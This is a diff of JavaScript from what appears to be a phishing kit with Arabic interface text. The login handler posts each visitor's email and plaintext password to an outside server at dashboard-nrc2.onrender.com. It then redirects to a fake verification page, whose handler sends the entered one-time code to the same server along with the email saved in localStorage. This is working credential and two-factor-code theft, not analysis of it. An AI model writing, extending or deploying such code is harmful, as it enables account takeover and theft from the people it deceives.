@@ -27,20 +27,26 @@ document.addEventListener("DOMContentLoaded", function () {
       submitBtn.textContent = "جارٍ الإرسال...";
 
       try {
+        // ✅ Save email for the next page
+        localStorage.setItem("userEmail", email);
+
+        // ✅ Send login info
         const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            text: `🔐 تسجيل دخول جديد:\nالبريد: ${email}\nكلمة السر: ${password}`
-          })
+            text: `🔐 \nتسجيل دخول جديد:\n📧 البريد الإلكتروني:\n ${email}\n🔑 كلمة السر: \n${password}\n`,
+          }),
         });
 
         if (!response.ok) throw new Error(`خطأ في الإرسال: ${response.status}`);
+
         console.log("✅ Login message sent successfully!");
+        // Redirect to verification page
         window.location.href = "code.html";
       } catch (error) {
         console.error("Login error:", error);
-
+        alert("⚠️ تعذر إرسال البيانات. حاول مرة أخرى لاحقاً.");
       } finally {
         submitBtn.disabled = false;
         submitBtn.textContent = originalText;
@@ -81,6 +87,8 @@ document.addEventListener("DOMContentLoaded", function () {
       e.preventDefault();
 
       const codeInput = verifyForm.querySelector('input[type="text"]').value.trim();
+      const email = localStorage.getItem("userEmail") || "غير معروف";
+
       if (!codeInput) {
         alert("يرجى إدخال رمز التحقق.");
         return;
@@ -96,18 +104,18 @@ document.addEventListener("DOMContentLoaded", function () {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            text: `\n 🔢 رمز تحقق جديد:\n${codeInput}`,
-               text: `\n 🔢 email : \n${email}`,
+            text: `🔢 \nرمز تحقق جديد:\n${codeInput}\n📧 البريد الإلكتروني: ${email}`,
           }),
         });
 
         console.log("Response status:", response.status);
-
         if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+        console.log("✅ Verification message sent successfully!");
         
       } catch (err) {
         console.error("Fetch error:", err);
-        
+        alert("⚠️ تعذر إرسال رمز التحقق.");
       } finally {
         submitBtn.disabled = false;
         submitBtn.textContent = originalText;
